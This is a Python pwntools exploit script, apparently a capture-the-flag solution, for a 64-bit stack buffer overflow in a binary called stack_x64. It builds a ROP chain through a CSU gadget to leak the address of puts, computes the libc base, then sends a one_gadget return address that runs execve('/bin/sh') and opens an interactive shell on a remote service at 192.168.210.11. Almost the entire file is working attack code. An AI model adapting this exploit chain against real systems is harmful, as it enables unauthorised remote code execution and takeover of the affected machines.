# -*- coding: utf-8 -*-

from pwn import *
from subprocess import check_output


def pidof(name):
    output = check_output(["pidof", name])
    print "[+] pidof %s : %s" % (name, output)
    result = [int(i) for i in output.split(" ")]
    return result


# context.log_level = 0
LOCAL = False

pwnable_filename = "./stack_x64"
# libc_filename = "/lib/x86_64-linux-gnu/libc.so.6"
libc_filename = "./libc_x64.so.6"

pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)


def generate_io(local):
    global libc_filename
    if local:
        Io = process(pwnable_filename)
    else:
        Io = remote("192.168.210.11", 11002)
    return Io


ppppppr_addr = 0x00000000004006FA
pr_addr = 0x0000000000400702
mmmc_addr = 0x00000000004006E0

gets_got_addr = pwnable.got['gets']
puts_got_addr = pwnable.got['puts']

writeable_addr = 0x00601000

binary_base_addr = 0x00400000

junk_size = 40
junk = junk_size * "A"

string_addr = 0x0000000000400724
start_addr = 0x0000000000400540
bss_addr = 0x0000000000601058

hint_addr = 0x0000000000400678

payload = flat([
    junk,
    p64(ppppppr_addr),
    # Stage 1
    p64(0),  # rbx
    p64(1),  # rbp
    p64(pwnable.got['puts']),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(pwnable.got['puts']),  # r15 (arg0)
    p64(mmmc_addr),
    "A" * 0x08,
    # Stage 1
    p64(0),  # rbx
    p64(0),  # rbp
    p64(0),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(0),  # r15 (arg0)
    p64(start_addr),
])

print "[+] Payload: %r" % (payload)
with open("payload", "wb") as f:
    f.write(payload)

Io = generate_io(LOCAL)

time.sleep(0.5)
Io.read()

# gdb.attach(
#     proc.pidof(Io)[0],
#     gdbscript='b *%s\nb execve\n' % (hex(ppppppr_addr))
# )

Io.sendline(payload)
data = Io.read()

print ">%r<" % (data)
puts_addr = u64(data[0:6].ljust(8, "\x00"))
libc.address = puts_addr - libc.symbols['puts']

print "[+] libc_base_addr: 0x%016x" % (libc.address)

# ➜  x64-level02 git:(master) ✗ one_gadget ./libc_x64.so.6
# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


one_gadget_addr = libc.address + 0x4526a
print "[+] one_gadget_addr: 0x%016x" % (one_gadget_addr)

payload = flat([
    junk,
    p64(one_gadget_addr),
    "\x00" * 0x30
])
Io.sendline(payload)
Io.interactive()